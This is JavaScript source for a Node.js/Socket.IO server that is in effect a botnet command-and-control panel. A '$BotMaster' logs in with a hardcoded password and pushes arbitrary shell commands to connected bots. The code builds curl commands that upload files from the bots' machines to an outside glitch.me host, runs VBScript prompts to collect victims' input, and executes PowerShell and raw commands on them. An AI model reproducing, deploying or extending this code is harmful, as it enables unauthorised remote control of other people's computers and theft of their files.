const express = require("express");
const http = require("http");
const socketIo = require("socket.io");
const cors = require("cors");
const multer = require("multer");
const fs = require("fs");
const path = require("path");

const app = express();
const server = http.createServer(app);

const corsOptions = {
  origin: ["https://raveneye.vercel.app/", "http://localhost:5173"],
  methods: ["GET", "POST"],
};

app.use(cors(corsOptions));

const io = socketIo(server, {
  cors: corsOptions,
});

const uploadDir = path.join(__dirname, "uploads");
const downloadDir = path.join(__dirname, "downloads");
const logFile = path.join(__dirname, "commands.log");

[uploadDir, downloadDir].forEach((dir) => {
  if (!fs.existsSync(dir)) {
    fs.mkdirSync(dir, { recursive: true });
  }
});

if (!fs.existsSync(logFile)) {
  fs.writeFileSync(logFile, "", "utf8");
}

app.use("/uploads", express.static(uploadDir));
app.use("/downloads", express.static(downloadDir));
app.use(express.static("public"));
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    const isCurl =
      req.headers["user-agent"] && req.headers["user-agent"].includes("curl");
    cb(null, isCurl ? uploadDir : downloadDir);
  },
  filename: (_, file, cb) => cb(null, file.originalname),
});

const upload = multer({ storage });

const password = "Dranzer1#";
let adminID = "";
const BotList = [];

app.post("/upload", upload.any(), (req, res) => {
  if (!req.files || req.files.length === 0) {
    return res.status(400).send("No files uploaded.");
  }
  res.send(
    `Files uploaded successfully: ${req.files
      .map((f) => f.originalname)
      .join(", ")}`
  );
});

const logCommand = (data) => {
  const logEntry = `${new Date().toISOString()} - User: ${
    data.user
  }, Command: ${data.cmd}\n`;
  fs.appendFile(logFile, logEntry, "utf8", (err) => {
    if (err) {
      console.error("Failed to write to log file:", err);
    }
  });
};

const getFilesInDirectory = (dir) => {
  try {
    return fs
      .readdirSync(dir)
      .filter((file) => fs.statSync(path.join(dir, file)).isFile());
  } catch (err) {
    console.error(`Error reading directory ${dir}:`, err);
    return [];
  }
};

io.on("connection", (socket) => {
  socket.on("intro", (user) => {
    if (user !== "$BotMaster") {
      BotList.push({ botName: user, socketId: socket.id });
      if (adminID) {
        io.to(adminID).emit("BotList", BotList);
      }
    }
  });

  socket.on("command", (data) => {
    logCommand(data);

    if (
      data.cmd === "uplist" ||
      data.cmd === "downlist" ||
      data.cmd === "downld" ||
      data.cmd === "upld"
    ) {
      if (socket.id !== adminID) {
        io.to(socket.id).emit("BotReply", "Access Denied!");
        return;
      }
    }

    if (data.cmd === "uplist") {
      const files = getFilesInDirectory(uploadDir);
      io.to(socket.id).emit("BotReply", `Uploaded files:\n${files.join("\n")}`);
      return;
    }

    if (data.cmd === "downlist") {
      const files = getFilesInDirectory(downloadDir);
      io.to(socket.id).emit(
        "BotReply",
        `Downloaded files:\n${files.join("\n")}`
      );
      return;
    }

    if (data.user === "$BotMaster" && data.cmd === password) {
      adminID = socket.id;
      io.to(adminID).emit("BotList", BotList);
    } else if (
      data.user === "$BotMaster" &&
      socket.id !== adminID &&
      data.cmd !== password
    ) {
      io.to(socket.id).emit("BotReply", "Access Denied!");
    }

    if (adminID && data.cmd !== password) {
      if (data.user !== "$BotMaster") {
        const botres = `${data.user} :\n${data.cmd}`;
        io.to(adminID).emit("BotReply", botres);
      } else {
        if (
          data.target.length === 0 &&
          data.cmd != "downlist" &&
          data.cmd != "uplist" &&
          data.cmd != "downld"
        ) {
          io.to(adminID).emit("BotReply", "No Bots Online or selected!");
        } else {
          data.target.forEach((target) => {
            const bot = BotList.find((object) => object.botName === target);
            if (bot) {
              if (data.cmd.startsWith("upld")) {
                let upfiles = data.cmd.split("&&");
                upfiles.shift();
                for (let i = 0; i < upfiles.length; i++) {
                  upfiles[i] = '-F "file=@' + upfiles[i] + '"';
                }
                let uploadFileNames = upfiles.join(" ");
                io.to(bot.socketId).emit(
                  "cmd",
                  "curl -X POST " +
                    uploadFileNames +
                    " https://raveneye.glitch.me/upload"
                );
              } else if (data.cmd.startsWith("warn ")) {
                let warningmsg = data.cmd.split(" ").slice(1).join(" ");
                io.to(bot.socketId).emit(
                  "cmd",
                  'echo MsgBox "' +
                    warningmsg +
                    '", 48, "Warning" > temp.vbs && temp.vbs && del temp.vbs'
                );
              } else if (data.cmd.startsWith("unzip ")) {
                let unzipmsg = data.cmd.split(" ");
                unzipmsg.shift();
                let zipmsg =
                  `powershell -command \"Expand-Archive -Path '` +
                  unzipmsg[0] +
                  `' -DestinationPath '.'"`;
                io.to(bot.socketId).emit("cmd", zipmsg);
              } else if (data.cmd.startsWith("ask ")) {
                let question = data.cmd.split(" ").slice(1).join(" ");
                let questString =
                  `echo input = InputBox("` +
                  question +
                  `:", "Input Prompt") > temp.vbs && echo Set fso = CreateObject("Scripting.FileSystemObject") >> temp.vbs && echo Set file = fso.CreateTextFile("output.txt", True) >> temp.vbs && echo file.WriteLine(input) >> temp.vbs && echo file.Close >> temp.vbs && cscript //nologo temp.vbs && del temp.vbs && type output.txt && del output.txt`;
                io.to(bot.socketId).emit("cmd", questString);
              } else {
                io.to(bot.socketId).emit("cmd", data.cmd);
              }
            }
          });
        }
      }
    } else {
      io.to(adminID).emit("BotReply", "clear");
    }
  });

  socket.on("disconnect", () => {
    if (socket.id !== adminID) {
      const index = BotList.findIndex((bot) => bot.socketId === socket.id);
      if (index !== -1) {
        BotList.splice(index, 1);
      }
      io.to(adminID).emit("BotList", BotList);
    }
  });
});

const PORT = process.env.PORT || 4000;
server.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
